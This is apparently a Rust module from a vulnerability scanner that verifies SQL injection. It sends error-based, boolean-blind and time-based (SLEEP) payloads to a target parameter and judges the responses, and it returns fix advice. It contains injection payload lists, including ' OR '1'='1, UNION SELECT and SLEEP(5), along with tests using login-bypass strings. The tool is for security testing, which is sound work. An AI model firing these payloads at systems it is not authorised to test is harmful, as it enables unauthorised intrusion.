//! SQL 注入利用验证
//!
//! 验证 SQL 注入漏洞的可利用性:
//! - 基于错误的 SQL 注入（检测响应中的 SQL 错误关键字）
//! - 布尔盲注（true/false 条件下的响应差异）
//! - 时间盲注（SLEEP/BENCHMARK 延时差异）
//! - UNION 查询注入（通过 ORDER BY 探测列数）
//!
//! 注意：本模块只做"无害化"验证（确认漏洞存在），不执行数据窃取或破坏操作

use crate::engine::VerifyEngine;
use crate::types::*;

/// SQL 注入验证器
pub struct SqliVerifier {
    engine: VerifyEngine,
}

impl SqliVerifier {
    pub fn new(engine: VerifyEngine) -> Self {
        Self { engine }
    }

    pub fn with_default_engine() -> Self {
        Self::new(VerifyEngine::with_default_config())
    }

    /// 验证单个参数的 SQL 注入
    ///
    /// - `url`: 目标 URL（参数已在 query 中或将在 body 中）
    /// - `method`: HTTP 方法 (GET/POST)
    /// - `param`: 要测试的参数名
    /// - `original_value`: 参数原始值
    pub async fn verify(
        &self,
        url: &str,
        method: &str,
        param: &str,
        original_value: &str,
    ) -> VerifyResult {
        let mut result = VerifyResult::new(url.to_string(), VulnType::Sqli);
        result.severity = "high".to_string();

        // 1. 先发送原始请求作为基线
        let baseline_req = build_request(url, method, param, original_value, None);
        let baseline_resp = match self.engine.send_request(&baseline_req).await {
            Ok(r) => r,
            Err(e) => {
                result.status = VerifyStatus::Error;
                result.evidence = format!("基线请求失败: {}", e);
                result.request = baseline_req;
                return result;
            }
        };

        // 2. 基于错误的 SQL 注入检测
        if let Some((payload, evidence)) = self.try_error_based(url, method, param).await {
            result.status = VerifyStatus::Verified;
            result.payload = Some(payload);
            result.evidence = evidence;
            result.request = build_request(url, method, param, &result.payload.clone().unwrap_or_default(), None);
            result.response = Some(baseline_resp);
            result.fix_advice = Some("使用参数化查询（预编译语句）；对输入进行白名单过滤；避免拼接 SQL".to_string());
            return result;
        }

        // 3. 布尔盲注检测
        if let Some((payload, evidence)) = self.try_boolean_based(url, method, param, &baseline_resp).await {
            result.status = VerifyStatus::Verified;
            result.payload = Some(payload);
            result.evidence = evidence;
            result.request = build_request(url, method, param, &result.payload.clone().unwrap_or_default(), None);
            result.response = Some(baseline_resp);
            result.fix_advice = Some("使用参数化查询；区分 true/false 响应的应用层逻辑可能被绕过".to_string());
            return result;
        }

        // 4. 时间盲注检测
        if let Some((payload, evidence)) = self.try_time_based(url, method, param).await {
            result.status = VerifyStatus::Verified;
            result.payload = Some(payload);
            result.evidence = evidence;
            result.request = build_request(url, method, param, &result.payload.clone().unwrap_or_default(), None);
            result.response = Some(baseline_resp);
            result.fix_advice = Some("使用参数化查询；时间盲注难以从应用层防御，必须从 SQL 构造层面修复".to_string());
            return result;
        }

        result.status = VerifyStatus::NotVerified;
        result.evidence = "未检测到 SQL 注入特征".to_string();
        result.request = baseline_req;
        result.response = Some(baseline_resp);
        result
    }

    /// 基于错误的 SQL 注入检测
    async fn try_error_based(
        &self,
        url: &str,
        method: &str,
        param: &str,
    ) -> Option<(String, String)> {
        for payload in SQLI_ERROR_PAYLOADS {
            let req = build_request(url, method, param, payload, None);
            if let Ok(resp) = self.engine.send_request(&req).await {
                let body_lower = resp.body.to_lowercase();
                for pattern in SQL_ERROR_PATTERNS {
                    if body_lower.contains(pattern) {
                        return Some((
                            payload.to_string(),
                            format!("SQL 错误关键字 '{}' 在响应中出现", pattern),
                        ));
                    }
                }
            }
        }
        None
    }

    /// 布尔盲注检测
    async fn try_boolean_based(
        &self,
        url: &str,
        method: &str,
        param: &str,
        baseline: &VerifyResponse,
    ) -> Option<(String, String)> {
        // 发送一个 true 条件 payload
        let true_req = build_request(url, method, param, SQLI_BOOLEAN_TRUE_PAYLOAD, None);
        let true_resp = self.engine.send_request(&true_req).await.ok()?;

        // 发送一个 false 条件 payload
        let false_req = build_request(url, method, param, SQLI_BOOLEAN_FALSE_PAYLOAD, None);
        let false_resp = self.engine.send_request(&false_req).await.ok()?;

        let baseline_len = baseline.body.len() as i64;
        let true_len = true_resp.body.len() as i64;
        let false_len = false_resp.body.len() as i64;

        // true 响应长度应接近基线，false 响应长度应有显著差异
        let true_diff = (true_len - baseline_len).abs();
        let false_diff = (false_len - baseline_len).abs();

        if true_diff < 50 && false_diff > 200 {
            return Some((
                SQLI_BOOLEAN_TRUE_PAYLOAD.to_string(),
                format!(
                    "布尔差异: baseline={}, true={}, false={} (true 接近基线，false 显著不同)",
                    baseline_len, true_len, false_len
                ),
            ));
        }
        None
    }

    /// 时间盲注检测
    async fn try_time_based(
        &self,
        url: &str,
        method: &str,
        param: &str,
    ) -> Option<(String, String)> {
        // 发送 SLEEP payload
        let sleep_req = build_request(url, method, param, SQLI_TIME_PAYLOAD, None);
        let sleep_resp = self.engine.send_request(&sleep_req).await.ok()?;

        // 基线响应时间（这里用 sleep_resp 的耗时比较）
        // 如果响应时间显著大于配置超时阈值，判定为时间盲注
        let threshold_ms = 3000; // 至少 3 秒才算时间盲注
        if sleep_resp.elapsed_ms >= threshold_ms {
            return Some((
                SQLI_TIME_PAYLOAD.to_string(),
                format!(
                    "时间盲注: 响应耗时 {}ms (超过 {}ms 阈值)",
                    sleep_resp.elapsed_ms, threshold_ms
                ),
            ));
        }
        None
    }
}

/// 构建 SQL 注入测试请求
fn build_request(
    url: &str,
    method: &str,
    param: &str,
    value: &str,
    _extra_headers: Option<&[(String, String)]>,
) -> VerifyRequest {
    let mut req = VerifyRequest::default();
    req.method = method.to_string();
    req.timeout_secs = 20; // 时间盲注可能较慢

    if method.eq_ignore_ascii_case("GET") {
        // 把参数加到 URL query
        let parsed = url::Url::parse(url).ok();
        if let Some(mut parsed) = parsed {
            parsed.query_pairs_mut().clear().append_pair(param, value);
            req.url = parsed.to_string();
        } else {
            req.url = url.to_string();
        }
    } else {
        // POST/PUT：参数放 body
        req.url = url.to_string();
        req.body = Some(format!("{}={}", param, value));
        req.headers.push((
            "Content-Type".to_string(),
            "application/x-www-form-urlencoded".to_string(),
        ));
    }
    req
}

/// 基于错误的 SQL 注入 payload
const SQLI_ERROR_PAYLOADS: &[&str] = &[
    "'",
    "\"",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "1' AND '1'='1",
    "1 UNION SELECT NULL--",
    "1; SELECT 1--",
    "1' ORDER BY 1--",
    "1' ORDER BY 9999--",
    "' AND (SELECT 1 FROM dual)=1--",
];

/// SQL 错误关键字
const SQL_ERROR_PATTERNS: &[&str] = &[
    "sql syntax",
    "mysql_fetch",
    "ora-",
    "oracle error",
    "postgresql query failed",
    "warning: pg_",
    "you have an error in your sql syntax",
    "sqlite3::",
    "sqlite3.exec",
    "odbc sql server driver",
    "unclosed quotation mark",
    "syntax error at or near",
    "incorrect syntax near",
    "ora-01756",
    "ora-00936",
    "ora-00942",
    "microsoft ole db provider for sql server",
    "sql server driver]",
    "invalid sql",
    "warning: sql",
];

/// 布尔盲注 payload：true 条件
const SQLI_BOOLEAN_TRUE_PAYLOAD: &str = "' AND '1'='1";

/// 布尔盲注 payload：false 条件
const SQLI_BOOLEAN_FALSE_PAYLOAD: &str = "' AND '1'='2";

/// 时间盲注 payload（MySQL SLEEP）
const SQLI_TIME_PAYLOAD: &str = "' AND SLEEP(5)--";

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_build_request_get() {
        let req = build_request(
            "http://example.com/page?id=1",
            "GET",
            "id",
            "1' OR '1'='1",
            None,
        );
        assert_eq!(req.method, "GET");
        assert!(req.url.contains("id=1"));
    }

    #[test]
    fn test_build_request_post() {
        let req = build_request(
            "http://example.com/login",
            "POST",
            "username",
            "admin' OR 1=1--",
            None,
        );
        assert_eq!(req.method, "POST");
        assert!(req.body.is_some());
        let body = req.body.unwrap();
        assert!(body.contains("username="));
    }

    #[test]
    fn test_build_request_post_content_type() {
        let req = build_request(
            "http://example.com/login",
            "POST",
            "username",
            "admin",
            None,
        );
        assert!(req.headers.iter().any(|(k, _)| k == "Content-Type"));
    }

    #[test]
    fn test_sqli_error_payloads_not_empty() {
        assert!(!SQLI_ERROR_PAYLOADS.is_empty());
    }

    #[test]
    fn test_sqli_error_patterns_not_empty() {
        assert!(!SQL_ERROR_PATTERNS.is_empty());
    }

    #[test]
    fn test_sqli_boolean_payloads() {
        assert!(SQLI_BOOLEAN_TRUE_PAYLOAD.contains("'1'='1"));
        assert!(SQLI_BOOLEAN_FALSE_PAYLOAD.contains("'1'='2"));
    }

    #[test]
    fn test_sqli_time_payload() {
        assert!(SQLI_TIME_PAYLOAD.contains("SLEEP"));
    }
}
